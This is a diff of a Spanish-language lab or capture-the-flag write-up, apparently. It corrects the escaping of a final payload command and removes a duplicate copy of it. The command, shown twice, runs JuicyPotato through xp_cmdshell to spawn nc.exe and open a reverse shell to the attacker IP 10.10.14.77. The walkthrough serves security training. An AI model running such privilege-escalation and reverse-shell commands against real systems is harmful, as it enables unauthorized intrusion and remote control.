@@ -542,10 +542,10 @@ Nuestra ip atacante es: `10.10.14.77`.
 En la máquina víctima ejecutamos el payload final:
 
 ```powershell
-xp_cmdshell C:\Tools\\JuicyPotato.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\Tools\nc.exe 10.10.14.77 8443 -e cmd.exe" -t *
+xp_cmdshell C:\Tools\JuicyPotato.exe -l 53375 -p "C:\Windows\System32\cmd.exe" -a " /c C:\\Tools\\nc.exe 10.10.14.77 8443 -e cmd.exe" -t *
 ```
 
-xp_cmdshell C:\Tools\JuicyPotato.exe -l 53375 -p "C:\Windows\System32\cmd.exe" -a " /c C:\\Tools\\nc.exe 10.10.14.77 8443 -e cmd.exe" -t *
+
 
 <img width="1874" height="570" alt="image" src="https://github.com/user-attachments/assets/41c18221-603e-4a3d-be1b-35a80424faaf" />
 
